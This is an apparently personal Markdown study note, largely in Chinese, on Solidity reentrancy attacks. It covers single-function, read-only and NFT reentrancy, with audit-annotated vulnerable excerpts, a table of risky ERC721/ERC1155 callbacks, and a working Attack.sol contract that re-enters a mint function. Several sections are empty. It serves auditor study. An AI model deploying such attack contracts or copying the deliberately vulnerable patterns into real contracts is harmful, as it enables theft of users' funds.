---
title: Reentrancy
tags:
- Solidity
- Reentrancy
---
# Reentrancy Attack

现实世界的智能合约经常对其他智能合约进行外部调用。智能合约审计员或攻击者必须始终检查这些外部调用，以查看是否存在允许他们在交易中重新输入目标合约并利用。
# Type
- Single-Function Reentrancy
- Cross-Function Reentrancy
- Cross-Contract Reentrancy
- Cross-Chain Reentrancy
- Read_only_reentrancy

# Signle-Function Reentrancy
```solidity
contract DepositFunds {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }
}
```
# Cross-Function Reentrancy

# Cross-Contract Reentrancy
条件：
- 攻击者可以控制执行流程来操纵合约状态。
- 合约中状态的值在另一个合约中共享或使用。

Find the Example in here

```solidity

```
# Read_only_reentrancy
Read Only Rentrancy 指的是view函数被重入了，因为View函数无法修改链上数据，所以一般view函数不会被保护。但是如果状态不一致，则可能会报告错误的值。其他依赖返回值的协议可能会被欺骗读取错误的状态以执行不需要的操作。

比如协议和其他Defi协议集成，用来读取代币价格或者读取在特定协议上铸造wrapped代笔的价格时，攻击者可以滥用这种情况，并且利用价格操纵来执行只读重入攻击。
想要完成ReadOnly Attack，需要一些前置条件:
- Some State
- A External call , and state will be modified after call
- Another contract depends on this state
# Re-entrancy Bypass Verification Checks
```solidity
function _removeCollateral(address sendTo, IPaprController.Collateral calldata collateral,
                           uint256 oraclePrice,uint256 cachedTarget) internal {
    if (collateralOwner[collateral.addr][collateral.id] != msg.sender) {
        revert IPaprController.OnlyCollateralOwner();
    }

    delete collateralOwner[collateral.addr][collateral.id];

    uint16 newCount;
    unchecked {
        newCount = _vaultInfo[msg.sender][collateral.addr].count - 1;
        _vaultInfo[msg.sender][collateral.addr].count = newCount;
    }
    //
    // @audit CRITICAL Re-Entrancy attack due to not following Check-Effects-Interaction pattern
    // ERC721.safeTransferFrom() calls sendTo.onERC721Received() if sendTo is a contract.
    //
    // 1) attacker deposits multiple nfts as collateral into one vault & borrows max amount against them
    //
    // 2) attacker calls removeCollateral() for first nft, then in AttackContract.onERC721Received() 
    //    calls removeCollateral() for second nft & so on until only 1 nft left in vault as collateral
    //
    // 3) for last nft AttackContract.onERC721Received() calls startLiquidationAuction()
    //    then purchaseLiquidationAuctionNFT() to buy their own nft via liquidation auction.
    //    As this was the vault's last collateral nft, the vault debt will be set to 0 which passes the
    //    subsequent checks that would have never passed.
    //
    collateral.addr.safeTransferFrom(address(this), sendTo, collateral.id);

    uint256 debt = _vaultInfo[msg.sender][collateral.addr].debt;
    uint256 max = _maxDebt(oraclePrice * newCount, cachedTarget);

    if (debt > max) {
        revert IPaprController.ExceedsMaxDebt(debt, max);
    }

    emit RemoveCollateral(msg.sender, collateral.addr, collateral.id);
}

```
# Re-entrancy Bypass Storage Writes
```solidity
    /// @dev Split the units of `_tokenID` owned by `account` across `_values`
    /// @dev `_values` must sum to total `units` held at `_tokenID`
    function _splitValue(address _account, uint256 _tokenID, uint256[] calldata _values) internal {
        // ... //
        uint256 valueLeft = tokenValues[_tokenID];
        // ... //

        for (uint256 i; i < len; ) {
            valueLeft -= values[i];

            tokenValues[toIDs[i]] = values[i];

            unchecked {
                ++i;
            }
        }
        //
        // @audit CRITICAL Re-entrancy attack due to not following the Check-Effects-Interaction pattern
        //
        // ERC1155._mintBatch() will call _account.onERC1155BatchReceived() if
        // _account is contract. AttackContract.onERC1155BatchReceived() can hijack execution
        // flow by re-entering _splitValue() via HypercertMinter.splitValue() many times to mint a huge amount
        // of fractions for the same _tokenID as the decreased valueLeft has not been written to storage before
        // calling ERC1155._mintBatch()
        //

        _mintBatch(_account, toIDs, amounts, "");

        tokenValues[_tokenID] = valueLeft;

        emit BatchValueTransfer(typeIDs, fromIDs, toIDs, values);
    }
```
# NFT Reentrancy
尽管NFT标准（ERC721/ERC1155）为了防止用户误把资产转入黑洞而加入了安全转账，但是如果转入地址为合约，则会调用该地址相应的检查函数，确保它已准备好接收NFT资产。
例如 ERC721 的 safeTransferFrom() 函数会调用目标地址的 onERC721Received() 函数，而黑客可以把恶意代码嵌入其中进行攻击。

## 危险函数表
| Standard | Vulnerablefunction                  |
| -------- | ----------------------------------- |
| ERC721   | safeTransferFrom                    |
|          | _safeTransfer                       |
|          | _safeMint                           |
|          | _checkonERC721Received              |
| ERC1155  | safeTransferFrom                    |
|          | _safeTransferFrom                   |
|          | safeBatchTransferFrom               |
|          | _safeBatchTransferFrom              |
|          | _mint                               |
|          | _mintBatch                          |
|          | _doSafeTransferAcceptanceCheck      |
|          | _doSafeBatchTransferAcceptanceCheck |


## Example
Code from [WTF](https://github.com/AmazingAng/WTF-Solidity/blob/main/S16_NFTReentrancy/readme.md)

```solidity title="NFT.sol"
contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;
    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("Reentry NFT", "ReNFT"){}

    // 铸造函数，每个用户只能铸造1个NFT
    // 有重入漏洞
    function mint() payable external {
        // 检查是否mint过
        require(mintedAddress[msg.sender] == false);
        // 增加total supply
        totalSupply++;
        // mint
        _safeMint(msg.sender, totalSupply);
        // 记录mint过的地址
        mintedAddress[msg.sender] = true;
    }
}
```

```solidity title="Attack.sol"
contract Attack is IERC721Receiver{
    NFTReentrancy public nft; // 有漏洞的nft合约地址

    // 初始化NFT合约地址
    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }
    
    // 攻击函数，发起攻击
    function attack() external {
        nft.mint();
    }

    // ERC721的回调函数，会重复调用mint函数，铸造10个
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 10){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}
```

# Cross Reentrancy

# Refer
https://github.com/WTFAcademy/WTF-Solidity/tree/main/S01_ReentrancyAttack
https://dacian.me/re-entrancy-attacks
https://github.com/WTFAcademy/WTF-Solidity/tree/main/S16_NFTReentrancy
https://github.com/WTFAcademy/WTF-Solidity/tree/main/S17_CrossReentrancy
https://medium.com/zokyo-io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334

https://inspexco.medium.com/cross-contract-reentrancy-attack-402d27a02a15

https://www.youtube.com/watch?v=3T1t2ginfTg